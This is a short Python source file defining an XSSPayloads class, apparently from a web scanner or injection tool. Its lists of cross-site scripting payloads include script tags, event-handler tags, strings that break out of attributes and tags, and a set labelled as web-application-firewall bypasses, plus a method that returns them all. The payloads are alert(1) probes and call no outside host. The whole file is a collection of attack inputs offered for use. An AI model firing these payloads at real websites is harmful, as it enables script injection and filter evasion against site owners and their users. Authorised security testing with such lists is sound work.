class XSSPayloads:
    BASIC = [
        "<script>alert('XSS')</script>",
        "<script>alert(1)</script>",
        "javascript:alert('XSS')"
    ]
    
    WAF_BYPASS = [
        "<scr<script>ipt>alert(1)</scr</script>ipt>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "<iframe src=\"javascript:alert(1)\">",
        "<div onmouseover=alert(1)>",
        "<img/src/onerror=alert(1)>"
    ]
    
    ATTRIBUTE_BASED = [
        "\" onmouseover=alert(1) \"",
        "' onmouseover=alert(1) '",
        "\" onfocus=alert(1) autofocus \"",
        "\" onclick=alert(1) \""
    ]
    
    TAG_ATTRIBUTE_BASED = [
        "><script>alert(1)</script>",
        "\"><script>alert(1)</script>",
        "'><script>alert(1)</script>"
    ]
    
    @classmethod
    def get_all_payloads(cls):
        return list(set(cls.BASIC + cls.WAF_BYPASS + cls.ATTRIBUTE_BASED + cls.TAG_ATTRIBUTE_BASED))